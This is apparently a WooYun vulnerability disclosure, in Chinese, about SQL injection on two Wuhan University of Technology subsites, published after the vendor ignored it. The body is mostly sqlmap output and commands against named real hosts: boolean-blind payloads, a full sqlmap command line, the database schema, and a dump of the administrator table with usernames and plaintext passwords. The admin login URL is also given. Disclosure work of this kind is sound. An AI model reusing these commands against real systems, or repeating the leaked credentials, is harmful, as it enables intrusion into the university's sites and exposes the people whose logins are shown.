wybug_title: 武汉理工大学两子站存在SQL注入漏洞
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-11-24：	细节已通知厂商并且等待厂商处理中									2015-11-29：	厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  注入点：http://pub2.whut.edu.cn/autodsh/shownews.asp?id=938&type=%B6%AD%CA%C2%BB%E1%B6%AF%CC%AC
sqlmap identified the following injection point(s) with a total of 81 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=938 AND 1638=1638&type=%B6%AD%CA%C2%BB%E1%B6%AF%CC%AC---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Accesssqlmap resumed the following injection point(s) from stored session:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=938 AND 1638=1638&type=%B6%AD%CA%C2%BB%E1%B6%AF%CC%AC---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft AccessDatabase: Microsoft_Access_masterdb[3 tables]+---------------+| administrator || article       || news          |+---------------+ Table: administrator[4 columns]+----------+-------------+| Column   | Type        |+----------+-------------+| id       | numeric     || password | non-numeric || type     | non-numeric || username | non-numeric |+----------+-------------+Database: Microsoft_Access_masterdbTable: administrator[3 entries]+----+------+------------+----------+| id | type | username   | password |+----+------+------------+----------+| 1  | <blank> | lonestone  | wangyong || 2  | <blank> | nattyboytl | 801027   || 3  | <blank> | hty        | 123456   |+----+------+------------+----------+
登陆后台：http://pub2.whut.edu.cn/autodsh/admin_login.asp

   漏洞证明：  http://svt.whut.edu.cn/search.asp的搜索框存在注入
sqlmap.py -u http://svt.whut.edu.cn/search.asp --data="siteID=26&id=2016&x=12&y=6" -p id --batch	POST parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Nsqlmap identified the following injection point(s) with a total of 83 HTTP(s) requests:---Parameter: id (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: siteID=26&id=2016%' AND 7593=7593 AND '%'='&x=12&y=6---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access

wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-11-29 12:28 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无
